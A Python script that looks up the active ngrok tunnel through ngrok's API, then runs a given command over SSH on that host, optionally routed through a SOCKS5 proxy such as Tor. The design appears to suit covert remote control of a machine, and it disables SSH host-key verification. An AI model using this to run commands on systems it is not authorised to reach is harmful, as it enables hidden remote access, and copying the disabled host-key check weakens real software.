import argparse
import asyncio
import asyncssh
import sys
import requests
import socks

from urllib.parse import urlsplit

        
async def run_client(command: str, proxy: str = None) -> None:
    asyncssh_kwargs = {
        'known_hosts': None,
        'client_keys': ['id_rsa']
    }

    if proxy:
        # Parse the proxy address using urlsplit
        proxy_parts = urlsplit(proxy)

        # Create a SOCKS5 proxy object
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, proxy_parts.hostname, proxy_parts.port)

        # Establish the connection using the SOCKS proxy
        sock.connect((ngrok_host, int(ngrok_port)))

        # Assign the socket to asyncssh_kwargs
        asyncssh_kwargs['sock'] = sock

    async with asyncssh.connect(ngrok_host, int(ngrok_port), **asyncssh_kwargs) as conn:
        # send command to server and return result
        result = await conn.run(command, check=True)
        print("\033[1;32m" + result.stdout + "\033[0m", end='')


def main():
    parser = argparse.ArgumentParser(description='Run command to execute')
    parser.add_argument('command', type=str, help='Command to execute on server')
    parser.add_argument('--proxy', type=str, help='Proxy address to use (eg: socks5://127.0.0.1:9050)')

    args = parser.parse_args()
    command = args.command
    proxy = args.proxy
    
    # Specify your ngrok API key
    api_key = "INSERT_YOUR_API_KEY"

    # Set the API endpoint URL
    api_url = "https://api.ngrok.com/endpoints"

    # Set the headers with API key and Ngrok version
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Ngrok-Version": "2"
    }
    
    # Define global variables
    global ngrok_host, ngrok_port
    
    try:
        # Send the GET request using the same proxy if provided
        proxies = {'http': proxy, 'https': proxy, 'socks5':proxy} if proxy else None
        response = requests.get(api_url, headers=headers, proxies=proxies)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            data = response.json()
            try:
                endpoint = data["endpoints"][0]
                hostport = endpoint["hostport"]
                # Get host and port of ngrok tunnel
                ngrok_host, ngrok_port = hostport.split(":")
            except:
                print("[!] Error: No active ngrok tunnel found")
                sys.exit(1)
        else:
            print(f"[!] Error: {response.status_code} - {response.text}")
            sys.exit(1)

        asyncio.get_event_loop().run_until_complete(run_client(command, proxy))
    except (OSError, asyncssh.Error) as exc:
        sys.exit('[!] SSH connection failed: ' + str(exc))

if __name__ == '__main__':
    main()
